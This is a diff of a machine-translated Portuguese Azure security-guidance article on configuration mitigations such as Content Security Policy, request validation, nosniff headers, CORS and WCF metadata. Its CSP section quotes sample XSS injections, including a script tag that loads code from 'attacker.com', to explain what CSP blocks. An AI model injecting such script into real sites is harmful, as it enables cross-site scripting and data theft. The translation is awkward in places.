@@ -16,12 +16,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
-ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
+ms.openlocfilehash: 811feb26e492efeb505f43202bee484d3edfb8a5
+ms.sourcegitcommit: fdec8e8bdbddcce5b7a0c4ffc6842154220c8b90
 ms.translationtype: MT
 ms.contentlocale: pt-PT
-ms.lasthandoff: 04/28/2020
-ms.locfileid: "82204258"
+ms.lasthandoff: 05/19/2020
+ms.locfileid: "83658600"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Quadro de segurança: Gestão de Configuração / Atenuações 
 | Produto/Serviço | Artigo |
@@ -33,7 +33,7 @@ ms.locfileid: "82204258"
 | **Gateway de campo iot** | <ul><li>[Criptografe OS e divisórias adicionais de IoT Field Gateway com bit-locker](#field-bit-locker)</li><li>[Certifique-se de que as credenciais de login predefinidas do gateway de campo são alteradas durante a instalação](#default-change)</li></ul> |
 | **Gateway da nuvem iot** | <ul><li>[Certifique-se de que o Cloud Gateway implementa um processo para manter os firmware de dispositivos conectados atualizados](#cloud-firmware)</li></ul> |
 | **Limite de confiança de máquina** | <ul><li>[Certifique-se de que os dispositivos têm controlos de segurança de ponta configurados de acordo com as políticas organizacionais](#controls-policies)</li></ul> |
-| **Armazenamento Azure** | <ul><li>[Garantir a gestão segura das chaves de acesso ao armazenamento Azure](#secure-keys)</li><li>[Certifique-se de que só são permitidas origens fidedignas se o CORS estiver habilitado no armazenamento do Azure](#cors-storage)</li></ul> |
+| **Armazenamento do Azure** | <ul><li>[Garantir a gestão segura das chaves de acesso ao armazenamento Azure](#secure-keys)</li><li>[Certifique-se de que só são permitidas origens fidedignas se o CORS estiver habilitado no armazenamento do Azure](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[Ativar a funcionalidade de estrangulamento de serviço da WCF](#throttling)</li><li>[Divulgação de informação sobre o WCF através de metadados](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementar a Política de Segurança do Conteúdo (CSP) e desativar o javascript inline
@@ -45,7 +45,7 @@ ms.locfileid: "82204258"
 | **Tecnologias Aplicáveis** | Genérica |
 | **Atributos**              | N/D  |
 | **Referências**              | Uma Introdução à Política de [Segurança de Conteúdos,](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)Referência de Política de Segurança de [Conteúdo,](https://content-security-policy.com/) [Funcionalidades de Segurança,](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) [Introdução à política de segurança de conteúdos,](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) [posso usar cSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Passos** | <p>A Política de Segurança de Conteúdo (CSP) é um mecanismo de segurança de defesa em profundidade, uma norma W3C, que permite aos proprietários de aplicações web ter controlo sobre o conteúdo incorporado no seu site. O CSP é adicionado como um cabeçalho de resposta HTTP no servidor web e é aplicado do lado do cliente pelos navegadores. É uma política baseada em whitelist - um site pode declarar um conjunto de domínios fidedignos a partir dos quais conteúdos ativos como javaScript podem ser carregados.</p><p>A CSP proporciona os seguintes benefícios de segurança:</p><ul><li>**Proteção contra xSS:** Se uma página for vulnerável ao XSS, um intruso pode explorá-la de duas maneiras:<ul><li>Injetar. `<script>malicious code</script>` Esta exploração não funcionará devido à Restrição Base-1 da CSP</li><li>Injetar. `<script src="http://attacker.com/maliciousCode.js"/>` Esta exploração não funcionará, uma vez que o domínio controlado pelo atacante não estará na lista branca de domínios da CSP.</li></ul></li><li>**Controlo sobre a exfiltração** de dados: Se algum conteúdo malicioso numa página web tentar ligar-se a um website externo e roubar dados, a ligação será abortada por CSP. Isto porque o domínio alvo não estará na lista branca do CSP</li><li>**Defesa contra click-jacking:** click-jacking é uma técnica de ataque que usa a qual um adversário pode enquadrar um site genuíno e forçar os utilizadores a clicar em elementos UI. Atualmente, a defesa contra o jacking de cliques é conseguida configurando um cabeçalho de resposta- X-Frame-Options. Nem todos os navegadores respeitam este cabeçalho e o CSP será uma forma padrão de se defender contra o click-jacking</li><li>**Relatório de ataque em tempo real:** Se houver um ataque de injeção num website ativado por CSP, os navegadores ativarão automaticamente uma notificação para um ponto final configurado no servidor web. Desta forma, a CSP serve como um sistema de alerta em tempo real.</li></ul> |
+| **Passos** | <p>A Política de Segurança de Conteúdo (CSP) é um mecanismo de segurança de defesa em profundidade, uma norma W3C, que permite aos proprietários de aplicações web ter controlo sobre o conteúdo incorporado no seu site. O CSP é adicionado como um cabeçalho de resposta HTTP no servidor web e é aplicado do lado do cliente pelos navegadores. É uma política baseada em whitelist - um site pode declarar um conjunto de domínios fidedignos a partir dos quais conteúdos ativos como javaScript podem ser carregados.</p><p>A CSP proporciona os seguintes benefícios de segurança:</p><ul><li>**Proteção contra xSS:** Se uma página for vulnerável ao XSS, um intruso pode explorá-la de duas maneiras:<ul><li>`<script>malicious code</script>`Injetar. Esta exploração não funcionará devido à Restrição Base-1 da CSP</li><li>`<script src="http://attacker.com/maliciousCode.js"/>`Injetar. Esta exploração não funcionará, uma vez que o domínio controlado pelo atacante não estará na lista branca de domínios da CSP.</li></ul></li><li>**Controlo sobre a exfiltração** de dados: Se algum conteúdo malicioso numa página web tentar ligar-se a um website externo e roubar dados, a ligação será abortada por CSP. Isto porque o domínio alvo não estará na lista branca do CSP</li><li>**Defesa contra click-jacking:** click-jacking é uma técnica de ataque que usa a qual um adversário pode enquadrar um site genuíno e forçar os utilizadores a clicar em elementos UI. Atualmente, a defesa contra o jacking de cliques é conseguida configurando um cabeçalho de resposta- X-Frame-Options. Nem todos os navegadores respeitam este cabeçalho e o CSP será uma forma padrão de se defender contra o click-jacking</li><li>**Relatório de ataque em tempo real:** Se houver um ataque de injeção num website ativado por CSP, os navegadores ativarão automaticamente uma notificação para um ponto final configurado no servidor web. Desta forma, a CSP serve como um sistema de alerta em tempo real.</li></ul> |
 
 ### <a name="example"></a>Exemplo
 Política de exemplo: 
@@ -176,7 +176,7 @@ Por favor, note que é fundamental garantir que a lista de origens no atributo "
 | **Tecnologias Aplicáveis** | Formulários Web, MVC5 |
 | **Atributos**              | N/D  |
 | **Referências**              | [Validação de Pedidos - Prevenção de Ataques de Script](https://www.asp.net/whitepapers/request-validation) |
-| **Passos** | <p>A validação do pedido, uma funcionalidade de ASP.NET desde a versão 1.1, impede o servidor de aceitar conteúdo que contenha HTML não codificado. Esta funcionalidade foi concebida para ajudar a prevenir alguns ataques de injeção de scripts, pelo que o código de script ou HTML do cliente pode ser submetido inconscientemente a um servidor, armazenado e depois apresentado a outros utilizadores. Recomendamos ainda que valide todos os dados de entrada e o HTML os consiga quando apropriado.</p><p>A validação do pedido é realizada comparando todos os dados de entrada com uma lista de valores potencialmente perigosos. Se ocorrer uma correspondência, `HttpRequestValidationException`ASP.NET levanta um . Por defeito, a funcionalidade de Validação de Pedidos está ativada.</p>|
+| **Passos** | <p>A validação do pedido, uma funcionalidade de ASP.NET desde a versão 1.1, impede o servidor de aceitar conteúdo que contenha HTML não codificado. Esta funcionalidade foi concebida para ajudar a prevenir alguns ataques de injeção de scripts, pelo que o código de script ou HTML do cliente pode ser submetido inconscientemente a um servidor, armazenado e depois apresentado a outros utilizadores. Recomendamos ainda que valide todos os dados de entrada e o HTML os consiga quando apropriado.</p><p>A validação do pedido é realizada comparando todos os dados de entrada com uma lista de valores potencialmente perigosos. Se ocorrer uma correspondência, ASP.NET levanta um `HttpRequestValidationException` . Por defeito, a funcionalidade de Validação de Pedidos está ativada.</p>|
 
 ### <a name="example"></a>Exemplo
 No entanto, esta funcionalidade pode ser desativada ao nível da página: 
@@ -212,7 +212,7 @@ Por favor, note que a funcionalidade de Validação de Pedidos não é suportada
 | **Fase SDL**               | Compilação |  
 | **Tecnologias Aplicáveis** | Genérica |
 | **Atributos**              | N/D  |
-| **Referências**              | [IE8 Parte de Segurança V: Proteção Abrangente,](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) [Tipo MIME](https://en.wikipedia.org/wiki/Mime_type) |
+| **Referências**              | [IE8 Parte de Segurança V: Proteção Abrangente,](https://docs.microsoft.com/archive/blogs/ie/ie8-security-part-v-comprehensive-protection) [Tipo MIME](https://en.wikipedia.org/wiki/Mime_type) |
 | **Passos** | O cabeçalho X-Content-Type-Options é um cabeçalho HTTP que permite aos desenvolvedores especificar que o seu conteúdo não deve ser farejado mime. Este cabeçalho foi concebido para mitigar os ataques mime-sniffing. Para cada página que possa conter conteúdo controlável do utilizador, deve utilizar o cabeçalho HTTP X-Content-Type-Options:nosniff. Para ativar o cabeçalho necessário globalmente para todas as páginas da aplicação, pode fazer uma das seguintes páginas|
 
 ### <a name="example"></a>Exemplo
@@ -228,7 +228,7 @@ Adicione o cabeçalho no ficheiro web.config se a aplicação for hospedada pelo
 ```
 
 ### <a name="example"></a>Exemplo
-Adicione o cabeçalho\_através do Pedido de Início de Aplicação Global 
+Adicione o cabeçalho através do Pedido de Início de Aplicação Global \_ 
 ```csharp
 void Application_BeginRequest(object sender, EventArgs e)
 {
@@ -582,7 +582,7 @@ Para desativar o CORS para um controlador ou ação, utilize o atributo [Desativ
 
 | Título                   | Detalhes      |
 | ----------------------- | ------------ |
-| **Componente**               | Storage do Azure | 
+| **Componente**               | Armazenamento do Azure | 
 | **Fase SDL**               | Implementação |  
 | **Tecnologias Aplicáveis** | Genérica |
 | **Atributos**              | N/D  |
@@ -593,7 +593,7 @@ Para desativar o CORS para um controlador ou ação, utilize o atributo [Desativ
 
 | Título                   | Detalhes      |
 | ----------------------- | ------------ |
-| **Componente**               | Storage do Azure | 
+| **Componente**               | Armazenamento do Azure | 
 | **Fase SDL**               | Compilação |  
 | **Tecnologias Aplicáveis** | Genérica |
 | **Atributos**              | N/D  |
@@ -632,7 +632,7 @@ Segue-se uma configuração de exemplo com estrangulamento ativado:
 | **Tecnologias Aplicáveis** | .Quadro líquido 3 |
 | **Atributos**              | N/D  |
 | **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
-| **Passos** | Os metadados podem ajudar os atacantes a aprender sobre o sistema e planear uma forma de ataque. Os serviços wCF podem ser configurados para expor metadados. Os metadados dão informações detalhadas sobre a descrição do serviço e não devem ser transmitidos em ambientes de produção. `HttpGetEnabled`  /  As `HttpsGetEnabled` propriedades da classe ServiceMetaData definem se um serviço irá expor os metadados | 
+| **Passos** | Os metadados podem ajudar os atacantes a aprender sobre o sistema e planear uma forma de ataque. Os serviços wCF podem ser configurados para expor metadados. Os metadados dão informações detalhadas sobre a descrição do serviço e não devem ser transmitidos em ambientes de produção. As `HttpGetEnabled`  /  `HttpsGetEnabled` propriedades da classe ServiceMetaData definem se um serviço irá expor os metadados | 
 
 ### <a name="example"></a>Exemplo
 O código abaixo instrui a WCF a transmitir metadados de um serviço
